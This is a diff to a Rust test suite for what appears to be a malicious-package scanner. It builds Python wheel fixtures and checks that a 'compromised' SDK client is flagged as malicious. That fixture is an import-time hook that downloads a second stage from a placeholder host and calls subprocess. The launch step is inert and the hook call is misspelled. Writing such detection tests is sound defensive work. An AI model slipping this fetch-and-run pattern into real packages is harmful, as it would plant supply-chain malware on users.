@@ -272,6 +272,67 @@ fn wheel_capability_zip() -> Vec<u8> {
         .into_inner()
 }
 
+const CLEAN_SDK_CLIENT_FIXTURE: &[u8] = br#"import os
+import urllib.request
+
+api_url = os.getenv("SPINE_SDK_API_URL", "https://example.invalid/v1")
+
+def status():
+    return urllib.request.urlopen(api_url + "/status")
+"#;
+
+const COMPROMISED_SDK_CLIENT_FIXTURE: &[u8] = br#"import subprocess
+import urllib.request
+
+def _fetch_and_launch():
+    payload = urllib.request.urlopen("https://example.invalid/second-stage").read()
+    subprocess.run(["printf", "inert-second-stage"], check=False)
+    return payload
+
+_fecth_and_launch()
+"#;
+
+fn wheel_sdk_client_zip(version: &str, client: &[u8]) -> Vec<u8> {
+    let metadata =
+        format!("Metadata-Version: 2.3\nName: spine-sdk-client\nVersion: {version}\n").into_bytes();
+    let wheel =
+        b"Wheel-Version: 1.0\nGenerator: whoathere-test\nRoot-Is-Purelib: true\nTag: py3-none-any\n";
+    let dist_info = format!("spine_sdk_client-{version}.dist-info");
+    let mut members = vec![
+        (format!("{dist_info}/METADATA"), metadata),
+        (format!("{dist_info}/WHEEL"), wheel.to_vec()),
+        (
+            "spine_sdk_client/__init__.py".to_string(),
+            b"from . import client\n".to_vec(),
+        ),
+        ("spine_sdk_client/client.py".to_string(), client.to_vec()),
+    ];
+    let record_path = format!("{dist_info}/RECORD");
+    let mut record = String::new();
+    for (path, bytes) in &members {
+        record.push_str(&format!(
+            "{path},{},{}\n",
+            wheel_record_hash(bytes),
+            bytes.len()
+        ));
+    }
+    record.push_str(&format!("{record_path},,\n"));
+    let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
+    for (path, bytes) in members.drain(..) {
+        writer
+            .start_file(path, SimpleFileOptions::default())
+            .expect("start SDK wheel member");
+        writer.write_all(&bytes).expect("write SDK wheel member");
+    }
+    writer
+        .start_file(record_path, SimpleFileOptions::default())
+        .expect("start SDK RECORD");
+    writer
+        .write_all(record.as_bytes())
+        .expect("write SDK RECORD");
+    writer.finish().expect("finish SDK wheel").into_inner()
+}
+
 fn sdist_tgz() -> Vec<u8> {
     let encoder = GzEncoder::new(Vec::new(), Compression::default());
     let mut archive = tar::Builder::new(encoder);
@@ -732,6 +793,124 @@ fn deterministic_python_artifact_detection_survives_wheel_and_sdist_product_spin
         assert!(!report.observed_clean);
         assert!(!report.sync_back_enabled);
     }
+}
+
+#[test]
+fn broken_second_stage_hook_retains_exact_network_process_capability_detection() {
+    let clean_root = TempRoot::new("whoathere-exact-spine-clean-sdk-wheel");
+    let clean_report = inspect(
+        &clean_root,
+        "spine_sdk_client-1.0.0-py3-none-any.whl",
+        &wheel_sdk_client_zip("1.0.0", CLEAN_SDK_CLIENT_FIXTURE),
+        Some(Ecosystem::Pypi),
+        (false, false),
+        (None, None),
+    );
+
+    assert!(clean_report.observations.iter().any(|observation| {
+        observation.finding_kind
+            == ExactArtifactFindingKindV1::DeterministicStatic(
+                ArtifactFindingCategory::EnvironmentExfiltrationCapability,
+            )
+            && !observation.behavior_detection_eligible
+    }));
+    assert!(clean_report
+        .observations
+        .iter()
+        .all(|observation| !observation.behavior_detection_eligible));
+    assert_eq!(clean_report.behavior_detection_count, 0);
+    assert_eq!(
+        clean_report.verdict,
+        whoathere_runner::ExactArtifactVerdictV1::Inconclusive
+    );
+    assert_eq!(
+        clean_report.status,
+        ExactArtifactDispositionV1::Inconclusive
+    );
+
+    let compromised_root = TempRoot::new("whoathere-exact-spine-compromised-sdk-wheel");
+    let compromised_report = inspect(
+        &compromised_root,
+        "spine_sdk_client-1.0.1-py3-none-any.whl",
+        &wheel_sdk_client_zip("1.0.1", COMPROMISED_SDK_CLIENT_FIXTURE),
+        Some(Ecosystem::Pypi),
+        (false, false),
+        (None, None),
+    );
+
+    let observation = compromised_report
+        .observations
+        .iter()
+        .find(|observation| {
+            observation.finding_kind
+                == ExactArtifactFindingKindV1::DeterministicStatic(
+                    ArtifactFindingCategory::DownloadExecuteCapability,
+                )
+        })
+        .expect(
+            "the typo-broken import hook must retain its static network/process capability detection",
+        );
+    assert_eq!(
+        observation.source,
+        ExactArtifactObservationSourceV1::DeterministicStatic
+    );
+    assert_eq!(
+        observation.artifact_sha256.as_str(),
+        compromised_report.identity.artifact_sha256
+    );
+    assert_eq!(
+        observation.manifest_sha256.as_str(),
+        compromised_report.identity.manifest_sha256
+    );
+    assert!(observation.behavior_detection_eligible);
+    let ExactArtifactEvidenceReferenceV1::DeterministicStatic {
+        evidence_sha256,
+        location:
+            FindingLocation::File {
+                file_sha256,
+                range,
+                selected_bytes_sha256,
+                ..
+            },
+    } = &observation.evidence
+    else {
+        panic!("network/process capability detection must retain its exact client-file citation");
+    };
+    assert_ne!(evidence_sha256, &Sha256Digest::from_bytes(b""));
+    assert_eq!(
+        file_sha256,
+        &Sha256Digest::from_bytes(COMPROMISED_SDK_CLIENT_FIXTURE)
+    );
+    let (start, end) = match range {
+        EvidenceRange::Lines {
+            start_byte,
+            end_byte,
+            ..
+        }
+        | EvidenceRange::Bytes {
+            start_byte,
+            end_byte,
+        } => (*start_byte as usize, *end_byte as usize),
+    };
+    assert_eq!(
+        &COMPROMISED_SDK_CLIENT_FIXTURE[start..end],
+        b"subprocess.run("
+    );
+    assert_eq!(
+        selected_bytes_sha256,
+        &Sha256Digest::from_bytes(&COMPROMISED_SDK_CLIENT_FIXTURE[start..end])
+    );
+    assert_eq!(
+        compromised_report.verdict,
+        whoathere_runner::ExactArtifactVerdictV1::Malicious
+    );
+    assert_eq!(
+        compromised_report.status,
+        ExactArtifactDispositionV1::Findings
+    );
+    assert!(compromised_report.behavior_detection_count > 0);
+    assert!(!compromised_report.admission_authority);
+    assert!(!compromised_report.observed_clean);
 }
 
 #[test]
